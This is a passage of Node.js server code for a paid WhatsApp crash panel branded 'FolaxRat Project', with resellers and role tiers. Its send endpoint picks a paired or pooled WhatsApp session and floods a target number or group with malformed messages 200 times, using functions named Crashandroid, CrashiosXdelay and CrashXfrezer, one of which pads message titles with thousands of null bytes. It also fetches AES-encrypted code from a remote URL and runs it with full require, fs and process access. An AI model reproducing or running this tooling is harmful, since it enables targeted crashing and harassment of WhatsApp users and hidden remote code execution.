  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const roleCooldowns = { "member":250, "reseller":290, "admin":60, "high admin":30, "vip":10, "owner":1, "high owner":1 };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] ?? 60;

  if (!user.lastSend) user.lastSend = 0;
  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);

  if (diffSeconds < cooldownSeconds) {
    return res.json({
      valid: true, sended: false,
      cooldown: true, wait: cooldownSeconds - diffSeconds,
    });
  }

  user.lastSend = now;
  saveDatabase(db);

  res.json({ valid: true, sended: true, cooldown: false, role });

  setImmediate(async () => {
    saveUserLog(user.username, "bug",
      `Kirim Bug: ${bug.toUpperCase()}`,
      `Target: ${target} | Mode: ${senderMode} | Role: ${role}`
    );

    let sock = null;

    // ── Cek akses sender global ──────────────────────────────────────
    const allowedGlobalRoles = ['high owner', 'owner', 'high admin', 'admin', 'reseller', 'vip'];
    const isAllowedGlobal = allowedGlobalRoles.includes(user.role);

    if (senderMode === 'global' && isAllowedGlobal) {
      // Pool global = HANYA sender dari global_pool (dari member)
      const globalEntries = Object.entries(activeConnections).filter(
        ([name]) => connectionMeta[name] && connectionMeta[name].type === 'global'
      );
      if (globalEntries.length === 0) {
        console.warn(`[❌] Global: tidak ada global sender aktif (global_pool kosong).`);
        return;
      }
      sock = globalEntries[Math.floor(Math.random() * globalEntries.length)][1];
      console.log(`[🌍] Global sender dipilih. Role: ${user.role} | Total global pool: ${globalEntries.length}`);

    } else if (senderMode === 'global' && !isAllowedGlobal) {
      // Role member tidak boleh global → fallback ke private
      console.warn(`[⛔] Role '${user.role}' tidak diizinkan akses global. Fallback ke private.`);
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        console.warn(`[❌] Private fallback: tidak ada sock untuk ${user.username}.`); return;
      }

    } else if (user.role === 'vip') {
      let pool = [];
      const vipPath = path.join(__dirname, 'vip');
      const userPath = path.join(__dirname, 'permenmd', user.username);
      if (fs.existsSync(vipPath)) pool.push(...getActiveSocketsFromPath(vipPath));
      if (fs.existsSync(userPath)) pool.push(...getActiveSocketsFromPath(userPath));
      if (pool.length === 0) {
        console.warn(`[❌] VIP: tidak ada sock.`); return;
      }
      sock = pool[Math.floor(Math.random() * pool.length)];
      console.log(`[👑] VIP pool. Total: ${pool.length}`);

    } else {
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        console.warn(`[❌] Private: tidak ada sock untuk ${user.username}.`); return;
      }
      console.log(`[🔒] Private: ${user.username}`);
    }

    const attemptSend = async (sock, retry = false) => {
      let sessionName = null;
      try {
        for (const [k, v] of Object.entries(activeConnections)) {
          if (v === sock) { sessionName = k; break; }
        }

        let targetJid = "";

        if (isGroupLink) {
          const inviteCode = target.match(groupRegex)[1];
          console.log(`[🔗] Invite: ${inviteCode}`);
          let groupInfo;
          try { groupInfo = await sock.groupGetInviteInfo(inviteCode); }
          catch (e) { throw new Error("Invite group invalid / expired"); }
          targetJid = groupInfo.id;
          try {
            await sock.groupAcceptInvite(inviteCode);
            console.log(`[✅] Join group: ${targetJid}`);
          } catch { console.log(`[⚠️] Already joined`); }

        } else if (isGroupJid) {
          targetJid = target;
        } else {
          targetJid = target.replace(/\D/g, "") + "@s.whatsapp.net";
        }

        console.log(`[🎯] JID: ${targetJid}`);
//command 
        switch (bug) {
          case "delay_hard":
            for (let i = 0; i < 200; i++) {
             await delay(sock, targetJid);
             await DelayGatauPokonyaDelay(sock, targetJid);
             await delayXhard(sock, targetJid);
             await sleep(1000);
            }
            break;
          case "freeze":
            for (let i = 0; i < 200; i++) {
             await CrashXfrezer(sock, targetJid);
             await sleep(1000); 
            }
            break;
          case "crash_android":
            for (let i = 0; i < 200; i++) {
             await Crashandroid(sock, targetJid);
             await Miyabicrash(sock, targetJid);
             await sleep(1000); 
            }
            break;
          case "crash_ios":
            for (let i = 0; i < 200; i++) {
             await CrashiosXdelay(sock, targetJid);
             await sleep(2000); 
            }
            break;
          case "delay_x_crash":
            for (let i = 0; i < 200; i++) {
             await Miyabi(sock, targetJid);
             await sleep(2000); 
            }
            break;
          default:
            console.warn(`[⚠️] Bug '${bug}' tidak dikenal`);
        }

        console.log(`[✅] '${bug}' terkirim ke ${targetJid}`);
        return true;

      } catch (err) {
        console.warn(`[⚠️] ${err.message}`);
        if (sessionName && err.message === 'Connection Closed') {
          delete activeConnections[sessionName];
          console.log(`[🗑️] Session ${sessionName} dihapus`);
        }
        if (!retry) {
          const globalRolesRetry = ['high owner', 'owner', 'high admin', 'admin', 'reseller'];
          if (globalRolesRetry.includes(user.role) && senderMode === 'global') {
            // Retry: hanya dari global_pool
            const globalEntries = Object.entries(activeConnections).filter(
              ([n]) => connectionMeta[n] && connectionMeta[n].type === 'global'
            );
            if (globalEntries.length > 0) {
              const retrySock = globalEntries[Math.floor(Math.random() * globalEntries.length)][1];
              console.log(`[🔄] Global retry: ${globalEntries.length} global sender tersedia`);
              return await attemptSend(retrySock, true);
            }
          } else if (user.role === 'vip') {
            let pool = [];
            const vipPath = path.join(__dirname, 'vip');
            const userPath = path.join(__dirname, 'permenmd', user.username);
            if (fs.existsSync(vipPath)) pool.push(...getActiveSocketsFromPath(vipPath));
            if (fs.existsSync(userPath)) pool.push(...getActiveSocketsFromPath(userPath));
            if (pool.length > 0) {
              return await attemptSend(pool[Math.floor(Math.random() * pool.length)], true);
            }
          } else {
            const retrySock = await checkActiveSessionInFolder(user.username);
            if (retrySock) return await attemptSend(retrySock, true);
          }
        }
        console.warn(`[❌] Gagal kirim '${bug}' ke ${target}`);
        return false;
      }
    };

    await attemptSend(sock);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

app.get("/getActiveSenders", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) return res.json({ valid: false, senders: [] });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, senders: [] });

  // Hanya 6 role ini yang boleh lihat active senders
  const allowedRoles = ['high owner', 'owner', 'high admin', 'admin', 'reseller', 'vip'];
  if (!allowedRoles.includes(user.role)) {
    console.warn(`[⛔] Role '${user.role}' tidak diizinkan akses /getActiveSenders`);
    return res.json({ valid: false, message: 'Akses ditolak. Role tidak diizinkan.', senders: [] });
  }

  // Hanya tampilkan sender GLOBAL (dari global_pool / member)
  const globalSenders = Object.keys(activeConnections).filter(
    name => connectionMeta[name] && connectionMeta[name].type === 'global'
  );
  console.log(`[✅] ${user.username} (${user.role}) getActiveSenders: ${globalSenders.length} global sender`);
  res.json({ valid: true, role: user.role, senders: globalSenders });
});

app.get("/getSenderStats", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const username = keyInfo.username;
  const baseDir = 'permenmd';
  let privateCount = 0;
  let globalCount = 0;

  try {
    const userPath = path.join(__dirname, baseDir, username);
    if (fs.existsSync(userPath)) {
      const files = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      files.forEach(f => {
        const sessionName = path.basename(f, ".json");
        if (activeConnections[sessionName]) privateCount++;
      });
    }

    if (fs.existsSync(baseDir)) {
      const allUsers = fs.readdirSync(baseDir).filter(p => {
        const pPath = path.join(baseDir, p);
        return fs.lstatSync(pPath).isDirectory();
      });

      allUsers.forEach(u => {
        const uPath = path.join(baseDir, u);
        if (fs.existsSync(uPath)) {
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
            if (activeConnections[sessionName]) globalCount++;
          });
        }
      });
    }

    res.json({
      valid: true,
      private: privateCount,
      global: globalCount
    });
  } catch (err) {
    console.error("[STATS ERROR]", err.message);
    res.status(500).json({ valid: false, error: "Server Error" });
  }
});

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  let conns = [];
  const globalRoles  = ['high owner', 'owner', 'high admin', 'admin', 'reseller'];
  const isGlobalRole = globalRoles.includes(user.role);
  const isVip        = user.role === 'vip';

  if (isGlobalRole) {
    // ── High Owner / Owner / High Admin / Admin / Reseller ─────────────────
    // Tampilkan: sender GLOBAL (dari global_pool) + sender PRIBADI sendiri
    console.log(`[${user.username}] Request mySender (Mode: ${user.role})`);

    // 1. Global sender — hanya yang type:'global' di connectionMeta
    const globalSenders = Object.keys(activeConnections).filter(
      name => connectionMeta[name] && connectionMeta[name].type === 'global'
    );
    globalSenders.forEach(name => {
      conns.push({ sessionName: name, source: 'global' });
    });

    // 2. Sender pribadi milik user ini saja
    const userPath = path.join(__dirname, 'permenmd', user.username);
    if (fs.existsSync(userPath)) {
      const userFiles = fs.readdirSync(userPath).filter(f => f.endsWith('.json'));
      userFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name] && !conns.find(c => c.sessionName === name)) {
          conns.push({ sessionName: name, source: 'private' });
        }
      });
    }
    console.log(`[✅] ${user.username} (${user.role}): ${conns.filter(c=>c.source==='global').length} global + ${conns.filter(c=>c.source==='private').length} private`);

  } else if (isVip) {
    // ── VIP: VIP Pool + Sender Pribadi ─────────────────────────────────────
    console.log(`[${user.username}] Request mySender (VIP Mode: VIP Pool + Personal)`);

    const vipPath = path.join(__dirname, 'vip');
    if (fs.existsSync(vipPath)) {
      const vipFiles = fs.readdirSync(vipPath).filter(f => f.endsWith('.json'));
      vipFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'vip' });
        }
      });
    }

    const userPath = path.join(__dirname, 'permenmd', user.username);
    if (fs.existsSync(userPath)) {
      const userFiles = fs.readdirSync(userPath).filter(f => f.endsWith('.json'));
      userFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name] && !conns.find(c => c.sessionName === name)) {
          conns.push({ sessionName: name, source: 'personal' });
        }
      });
    }
    console.log(`[✅] VIP senders untuk ${user.username}: ${conns.length}`);

  } else {
    // ── Member: hanya sender pribadi ───────────────────────────────────────
    console.log(`[${user.username}] Request mySender (Private Mode)`);
    conns = getActiveCredsInFolder(user.username);
  }

  return res.json({
    valid: true,
    role: user.role,
    totalSenders: conns.length,
    connections: conns
  });
});

const connectVipSessions = async () => {
  const vipPath = path.join(__dirname, 'vip');
  if (!fs.existsSync(vipPath)) {
    console.log(`[👑] Folder vip/ tidak ditemukan, skip.`);
    return;
  }

  const sessions = fs.readdirSync(vipPath).filter(name =>
    fs.statSync(path.join(vipPath, name)).isDirectory()
  );

  console.log(`[👑] VIP sessions ditemukan: ${sessions.length}`);

  await Promise.all(
    sessions.map(sessionName => {
      if (activeConnections[sessionName]) {
        console.log(`[⏭️] VIP ${sessionName} sudah aktif, skip`);
        return Promise.resolve();
      }
      return connectSession(vipPath, sessionName);
    })
  );

  console.log(`[👑] Semua VIP session selesai diproses.`);
};

app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query
  const keyInfo = activeKeys[key]
  if (!keyInfo) return res.json({ valid: false })

  const db = loadDatabase()
  const user = db.find(u => u.username === keyInfo.username)
  if (!user) return res.status(401).json({ error: "Invalid session key" })
  if (!number) return res.status(400).json({ error: "Number is required" })

  try {
    // ── Tentukan folder berdasarkan role ────────────────────────────────────
    // member, admin, reseller → global_pool (sender langsung masuk global)
    // role lain (vip, high admin, owner, high owner) → folder pribadi
    const GLOBAL_POOL_DIR = 'global_pool';
    const isGlobalRole = ['member', 'admin', 'reseller'].includes(user.role);
    const targetOwner = isGlobalRole ? GLOBAL_POOL_DIR : user.username;
    // isMember tetap didefinisikan agar tidak merusak referensi di bawah
    const isMember = isGlobalRole;
    
    const baseDir = path.join("permenmd", targetOwner);
    const sessionDir = path.join(baseDir, number);

    if (isGlobalRole) {
      console.log(`[🌍 PAIRING] Role ${user.role} → simpan ke global_pool: ${number}`);
    } else {
      console.log(`[🔒 PAIRING] Role ${user.role} → simpan ke pribadi (${user.username}): ${number}`);
    }

    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true })
    }

    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir, { recursive: true })
    }

    fs.mkdirSync(sessionDir, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    })

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "close") {
        const isLoggedOut =
          lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut
        if (!isLoggedOut) {
          await waiting(3000)
          // Reconnect ke folder yang sama (global_pool atau pribadi)
          await pairingWa(number, targetOwner)
        } else {
          delete activeConnections[number]
        }
      }
    })

    if (!sock.authState.creds.registered) {
      await waiting(1200)
      const code = await sock.requestPairingCode(number, "BIZZNIEH")
      if (code) {
        return res.json({ 
          valid: true, 
          number, 
          pairingCode: code,
          senderType: isMember ? 'global' : 'private'
        })
      }
      return res.json({ valid: false })
    }

    return res.json({ valid: false })
  } catch (err) {
    return res.status(500).json({ error: err.message })
  }
})

app.get("/createAccount", async (req, res) => {
  const { key, newUser, pass, day, role: requestedRole } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' role '${requestedRole}' dengan key '${key}'`);

  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username); 

  if (!creator) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({valid:true,authorized:false,created:false,message:"Unauthorized creator role"});
  }

  const roleLimits = {
    "high owner": 999,
    owner: 50,
    "high admin": 45,
    admin: 35,
    reseller: 30
  };

  const currentLimit = roleLimits[creator.role] || 0;
  const currentMonth = new Date().toISOString().slice(0, 7);

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ CREATE] Limit akun bulan ${creator.role} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  // Hierarki role yang boleh dibuat oleh masing-masing creator
  const createHierarchy = {
    "high owner": ['high owner', 'owner', 'high admin', 'admin', 'reseller', 'vip', 'member'],
    owner:      ['owner', 'high admin', 'admin', 'reseller', 'vip', 'member'],
    "high admin": ['high admin', 'admin', 'reseller', 'vip', 'member'],
    admin:      ['admin', 'reseller', 'vip', 'member'],
    reseller:   ['member']
  };

  const targetRole = requestedRole || 'member';
  const allowedRoles = createHierarchy[creator.role] || [];

  if (!allowedRoles.includes(targetRole)) {
    console.log(`[❌ CREATE] ${creator.role} tidak boleh membuat role ${targetRole}.`);
    return res.json({ valid: true, authorized: false, created: false, message: `Role ${creator.role} tidak bisa membuat akun dengan role ${targetRole}.` });
  }

  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: targetRole,
    parent: creator.username,
  };

  db.push(newAccount);
  creator.usageLog.count++;
  saveDatabase(db);

  saveUserLog(
    creator.username,
    "create",
    "Buat Akun Member",
    `User: ${newUser} | Durasi: ${day} Hari`
  );

  console.log(`[✅ CREATE] Akun berhasil dibuat: ${newAccount} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  appendLogAsync('logUser.txt', logLine);

  // Kirim notifikasi Telegram — MARKDOWN
  const waktuCreate = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
  const sisaKuota = currentLimit - creator.usageLog.count;
  const notifText =
    `🔔 *NOTIFIKASI CREATE AKUN*\n\n` +
    `👤 *Creator:* ${creator.username}\n` +
    `✅ *User Baru:* ${newUser}\n` +
    `🎯 *Role:* ${targetRole || 'member'}\n` +
    `📅 *Durasi:* ${day} hari\n` +
    `⏳ *Expired:* ${newAccount.expiredDate}\n` +
    `📊 *Sisa Slot:* ${sisaKuota}\n\n` +
    `🕐 *Waktu:* ${waktuCreate}\n` +
    `━━━━━━━━━━━━━━━━━━━\n` +
    `🔹 *FolaxRat Project*`;

  try {
    await sendTelegramNotif(notifText);
    console.log('[NOTIF CREATE ✅] Notif create terkirim');
  } catch (tgErr) {
    console.error('[NOTIF CREATE ❌] Gagal kirim notif:', tgErr.message);
  }

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get("/deleteUser", async (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const deleter = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!deleter || !targetUser) {
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  // Hanya high owner/owner yang bisa menghapus role owner/high owner
  if (['high owner', 'owner'].includes(targetUser.role) && !['high owner', 'owner'].includes(deleter.role)) {
    console.log(`[❌ DELETE] ${deleter.role} tidak boleh menghapus role owner/high owner.`);
    return res.json({ 
      valid: true, 
      authorized: false, 
      message: "Only owner/high owner can delete another owner account." 
    });
  }

  const roleLevel = {
    "high owner": 7,
    owner: 6,
    "high admin": 5,
    admin: 4,
    reseller: 3,
    vip: 2,
    member: 1
  };

  const deleterLevel = roleLevel[deleter.role] || 0;
  const targetLevel = roleLevel[targetUser.role] || 0;

  // Owner bisa hapus owner lain (level sama)
  if (deleterLevel < targetLevel) {
    console.log(`[❌ DELETE] ${deleter.role} (Lv ${deleterLevel}) tidak boleh menghapus ${targetUser.role} (Lv ${targetLevel}).`);
    return res.json({ valid: true, authorized: false, message: "You cannot delete a user with higher rank." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index !== -1) {
    const deletedUser = db[index];
    db.splice(index, 1);
    saveDatabase(db);

    const logLine = `${deleter.username} Deleted ${username}\n`;
    appendLogAsync('logUser.txt', logLine);
    
    // Kirim notifikasi Telegram — MARKDOWN
    const waktuDelete = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    const deletedRole = deletedUser.role || '-';
    const notifTextDel =
      `🔔 *NOTIFIKASI HAPUS AKUN*\n\n` +
      `👤 *Dihapus oleh:* ${deleter.username}\n` +
      `📛 *Username:* ${deletedUser.username}\n` +
      `🎯 *Role:* ${deletedRole}\n\n` +
      `🕐 *Waktu:* ${waktuDelete}\n` +
      `━━━━━━━━━━━━━━━━━━━\n` +
      `🔹 *FolaxRat Project*`;

    try {
      await sendTelegramNotif(notifTextDel);
      console.log('[NOTIF DELETE ✅] Notif delete terkirim');
    } catch (tgErr) {
      console.error('[NOTIF DELETE ❌] Gagal kirim notif:', tgErr.message);
    }
    
    console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
    return res.json({ valid: true, deleted: true, user: deletedUser });
  }

  return res.json({ valid: true, deleted: false, message: "Failed to delete user." });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);

  if (!requester || !["high owner", "owner", "high admin", "admin"].includes(requester.role)) {
    console.log(`[❌ LIST] ${requester?.username || "Unknown"} tidak memiliki izin melihat list.`);
    
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
    parent: u.parent || "SYSTEM"
  }));

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", async (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username); 

  // HIERARKI ROLE BARU
  const hierarchy = {
    "high owner": ['high owner', 'owner', 'high admin', 'admin', 'reseller', 'vip', 'member'],
    owner: ['owner', 'high admin', 'admin', 'reseller', 'vip', 'member'],
    "high admin": ['high admin', 'admin', 'reseller', 'vip', 'member'],
    admin: ['admin','reseller', 'vip', 'member'],
    reseller: ['member']
  };

  const creatorRole = (creator.role || "member");
  const targetRole = (role || "member");

  if (!creator) {
    console.log("[❌ USERADD] Tidak diizinkan (Role salah/Unauthorized).");
    return res.json({valid:true,authorized:false,created:false,message:"Unauthorized creator role"});
  }

  // ✅ Tidak ada pengecekan khusus untuk owner - Owner bebas buat owner lain

  if (!hierarchy[creatorRole].includes(targetRole)) {
    console.log(`[❌ USERADD] ${creatorRole} tidak boleh membuat ${targetRole}.`);
    return res.json({ valid: true, authorized: false, message: `Role ${creatorRole} cannot create ${targetRole}.` });
  }

  const roleLimits = {
    "high owner": 999,
    owner: 50,
    "high admin": 45,
    admin: 35,
    reseller: 30
  };

  const currentLimit = roleLimits[creatorRole] || 0;
  const currentMonth = new Date().toISOString().slice(0, 7);

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ USERADD] Limit akun bulan ${creatorRole} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: targetRole,
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  creator.usageLog.count++;
  saveDatabase(db);

  const logLine = `${creator.username} Created ${username} Role ${role} Days ${day}\n`;
  appendLogAsync('logUser.txt', logLine);
  const sisaKuotaUA = currentLimit - creator.usageLog.count;
  console.log(`[✅ USERADD] User berhasil dibuat: ${newUser} (Sisa Kuota: ${sisaKuotaUA})`);

  // === KIRIM NOTIF TELEGRAM ===
  const waktuUA = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
  const notifUA =
    `🔔 *NOTIFIKASI CREATE AKUN*\n\n` +
    `👤 *Creator:* ${creator.username}\n` +
    `✅ *User Baru:* ${username}\n` +
    `🎯 *Role:* ${targetRole || 'member'}\n` +
    `📅 *Durasi:* ${day} hari\n` +
    `⏳ *Expired:* ${expired.toISOString().split("T")[0]}\n` +
    `📊 *Sisa Slot:* ${sisaKuotaUA}\n\n` +
    `🕐 *Waktu:* ${waktuUA}\n` +
    `━━━━━━━━━━━━━━━━━━━\n` +
    `🔹 *FolaxRat Project*`;

  try {
    await sendTelegramNotif(notifUA);
    console.log('[NOTIF USERADD ✅] Notif terkirim');
  } catch (e) {
    console.error('[NOTIF USERADD ❌]', e.message);
  }
  // ============================

  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!editor || !["high owner", "owner", "high admin", "admin", "reseller"].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    
  }

  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // Owner bisa edit owner lain, hapus blok pengecekan khusus

  const roleLevel = {
    "high owner": 7, owner: 6, "high admin": 5, admin: 4, reseller: 3, vip: 2, member: 1
  };
  
  // Owner bisa edit owner lain (level sama)
  if (roleLevel[editor.role] < roleLevel[targetUser.role]) {
     return res.json({ valid: true, edited: false, message: "Cannot edit user with higher rank." });
  }

  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ EDIT] Reseller tidak boleh menambah masa aktif lebih dari 30 hari.");
    return res.json({ valid: true, edited: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser.username} Add Days ${addDays}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});


app.get("/getStats", (req, res) => {

  const db = loadDatabase();
  const totalUsers = db.length;

  // FIX: Online user = yang benar-benar terkoneksi WS saat ini
  const onlineUsers = Object.keys(wsClients).length;

  // Hitung per role
  const roleCount = {};
  db.forEach(u => {
    const r = u.role || "member";
    roleCount[r] = (roleCount[r] || 0) + 1;
  });

  return res.json({
    valid: true,
    totalUsers,
    onlineUsers,
    roleCount
  });
});

// Alias /stats → sama dengan /getStats
app.get("/stats", (req, res) => { req.url = "/getStats?" + (req.url.split("?")[1]||""); app.handle(req, res); });

app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || !["high owner", "owner"].includes(user.role)) {
    
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

//function delay hard
async function delay(sock, target) {
    let Justprend = {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    header: {
                        title: "Halim L nya Apa?🤓☝️" + '\x00'.repeat(6500)
                    },
                    body: {
